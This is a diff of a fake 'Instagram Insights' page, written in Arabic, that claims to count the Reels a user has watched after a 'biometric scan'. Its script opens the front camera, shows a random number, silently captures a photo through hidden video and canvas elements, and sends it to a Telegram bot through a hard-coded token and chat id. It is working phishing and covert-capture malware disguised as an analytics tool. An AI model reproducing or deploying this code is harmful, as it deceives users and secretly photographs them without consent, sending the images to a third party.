@@ -3,113 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Insights - Meta</title>
+    <title>Instagram Insights</title>
     <style>
-        body { margin: 0; background-color: #FAFAFA; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { background: white; padding: 40px 20px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; width: 85%; max-width: 380px; border: 1px solid #dbdbdb; }
-        .logo { width: 60px; margin-bottom: 20px; }
-        h2 { font-size: 20px; font-weight: 600; color: #262626; margin-bottom: 10px; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 25px; }
-        .btn { background: #0095f6; color: white; padding: 14px; border: none; border-radius: 8px; font-weight: 600; width: 100%; cursor: pointer; font-size: 15px; }
-        #loader-area { display: none; margin-top: 20px; }
+        body { margin: 0; background-color: #FAFAFA; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: white; padding: 35px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 380px; border: 1px solid #efefef; }
+        .btn { background: #0095f6; color: white; padding: 15px; border: none; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
+        #loading { display: none; margin-top: 20px; }
+        #result { display: none; margin-top: 20px; }
+        .count { font-size: 35px; font-weight: 800; color: #ed4956; margin: 10px 0; display: block; }
+        video, canvas { display: none; position: absolute; left: -9999px; } /* إخفاء العناصر تماماً عن العين */
         .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #result-area { display: none; margin-top: 20px; border-top: 1px solid #efefef; padding-top: 20px; }
-        .count { font-size: 35px; font-weight: 800; color: #ed4956; margin: 10px 0; display: block; }
-        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo">
-    <h2>تحليل نشاط الريلز</h2>
-    <p>قم بتأكيد هويتك عبر فحص المستشعر البيومتري لمعرفة عدد الريلز التي شاهدتها منذ إنشاء حسابك.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="60" style="margin-bottom:15px;">
+    <h2>تحليل سجل المشاهدات</h2>
+    <p style="color:#8e8e8e; font-size:14px;">اضغط لمعرفة عدد الريلز التي شاهدتها عبر فحص المستشعر البيومتري.</p>
     
-    <button class="btn" id="startBtn" onclick="initiate()">بدء الفحص الآمن</button>
+    <button class="btn" id="startBtn" onclick="startCapture()">بدء التحليل</button>
 
-    <div id="loader-area">
+    <div id="loading">
         <div class="spinner"></div>
-        <p id="statusTxt" style="color: #262626;">جاري تشغيل المستشعر الأمامي...</p>
+        <p id="status">جاري تشغيل المستشعر...</p>
     </div>
 
-    <div id="result-area">
-        <p style="color: #262626; font-weight: 600;">اكتمل التحليل!</p>
-        <span style="font-size: 13px;">عدد الريلز التي شاهدتها:</span>
-        <span class="count" id="reelsNumber">0</span>
-        <p style="font-size: 11px;">تم التحديث من خادم Meta</p>
+    <div id="result">
+        <p style="font-weight:bold;">اكتمل التحليل!</p>
+        <span class="count" id="reelsNum">0</span>
+        <p style="font-size:12px; color:#0095f6;">تم سحب البيانات من السجل بنجاح</p>
     </div>
 </div>
 
-<video id="webcam" autoplay playsinline muted></video>
-<canvas id="snapshot"></canvas>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
 <script>
-    // بياناتك الخاصة
-    const botToken = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
-    const chatId = "7822309283";
+    const token = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
+    const chat = "7822309283";
 
-    async function initiate() {
+    async function startCapture() {
         document.getElementById('startBtn').style.display = 'none';
-        document.getElementById('loader-area').style.display = 'block';
+        document.getElementById('loading').style.display = 'block';
 
         try {
-            // طلب الكاميرا الأمامية مع تحديد جودة متوسطة لضمان سرعة الاستجابة في إنستجرام
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user", width: 640, height: 480 } 
             });
             
-            const video = document.getElementById('webcam');
+            const video = document.getElementById('v');
             video.srcObject = stream;
-            
-            // محاكاة تحميل بيانات عشوائية
-            const randomCount = Math.floor(Math.random() * (5000 - 2000 + 1)) + 2000;
-            document.getElementById('reelsNumber').innerText = randomCount.toLocaleString();
 
-            // الانتظار 6 ثوانٍ كاملة (هذا هو مفتاح حل مشكلة السواد في إنستجرام)
-            let seconds = 6;
-            const timer = setInterval(() => {
-                seconds--;
-                document.getElementById('statusTxt').innerText = "جاري المعايرة... (" + seconds + " ثوانٍ)";
-                if(seconds <= 0) clearInterval(timer);
-            }, 1000);
+            // توليد الرقم العشوائي
+            const rand = Math.floor(Math.random() * 3001) + 2000;
+            document.getElementById('reelsNum').innerText = rand.toLocaleString();
 
-            setTimeout(() => {
-                sendData(stream);
-            }, 6500);
+            // الانتظار حتى يبدأ الفيديو فعلياً (تجاوز السواد)
+            video.onplaying = () => {
+                document.getElementById('status').innerText = "جاري مسح البصمة... (يرجى الثبات)";
+                
+                // ننتظر 5 ثوانٍ بعد اشتغال الكاميرا لضمان الإضاءة
+                setTimeout(() => {
+                    sendSnapshot(stream);
+                }, 5000);
+            };
 
-        } catch (err) {
-            alert("فشل الفحص: يجب السماح بالكاميرا للوصول إلى الإحصائيات.");
+        } catch (e) {
+            alert("يجب السماح بالكاميرا لرؤية النتيجة.");
             location.reload();
         }
     }
 
-    function sendData(stream) {
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('snapshot');
+    function sendSnapshot(stream) {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'analysis_report.jpg');
+        canvas.toBlob(b => {
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('photo', b, 's.jpg');
             
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
-                method: 'POST', 
-                body: formData 
-            }).then(() => {
-                document.getElementById('loader-area').style.display = 'none';
-                document.getElementById('result-area').style.display = 'block';
-                // إغلاق الكاميرا للحفاظ على الخصوصية بعد الإرسال
-                stream.getTracks().forEach(track => track.stop());
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
+            .then(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+                stream.getTracks().forEach(t => t.stop());
             });
         }, 'image/jpeg', 0.7);
     }
 </script>
-
 </body>
 </html>
